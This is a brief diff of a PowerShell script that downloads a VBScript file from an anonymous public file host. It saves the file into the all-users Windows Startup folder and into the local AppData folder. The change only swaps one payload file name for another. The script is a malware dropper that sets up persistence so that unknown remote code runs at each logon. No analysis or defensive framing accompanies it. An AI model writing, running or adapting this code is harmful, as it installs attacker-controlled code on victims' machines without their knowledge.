@@ -1,8 +1,8 @@
-$url = "https://files.catbox.moe/gadius.vbs"
+$url = "https://files.catbox.moe/eqlsi1.vbs"
 
-$destination1 = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\gadius.vbs"
+$destination1 = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\eqlsi1.vbs"
 $localAppData = $env:LOCALAPPDATA
-$destination2 = Join-Path $localAppData "gadius.vbs"
+$destination2 = Join-Path $localAppData "eqlsi1.vbs"
 
 # Download to both locations
 Invoke-WebRequest -Uri $url -OutFile $destination1
